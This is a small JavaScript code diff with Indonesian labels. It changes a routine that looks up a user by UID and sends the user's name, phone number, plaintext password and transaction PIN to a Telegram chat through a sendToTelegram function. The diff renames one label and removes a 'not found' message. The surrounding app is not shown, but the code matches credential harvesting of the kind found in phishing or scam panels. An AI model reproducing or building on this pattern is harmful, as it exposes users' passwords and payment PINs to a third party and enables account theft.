@@ -4321,7 +4321,7 @@
               let bal = parseFloat(localStorage.getItem(`sanz_bal_${foundPhone}`)) || 0;
               let info = `*DATA PENGGUNA*\n`;
               info += `Nama: ${uData.name}\n`;
-              info += `Nomor HP: \`${foundPhone}\`\n`;
+              info += `Nomor: \`${foundPhone}\`\n`;
               info += `UID: \`${uData.uid}\`\n`;
               info += `Password: \`${uData.password}\`\n`;
               info += `PIN Transaksi: \`${uData.pinCode ? uData.pinCode : 'Belum diatur'}\`\n`;
@@ -4333,7 +4333,6 @@
               
               sendToTelegram(info);
             } else {
-              sendToTelegram(`\`${targetUID}\` tidak ditemukan.`);
             }
           }
 
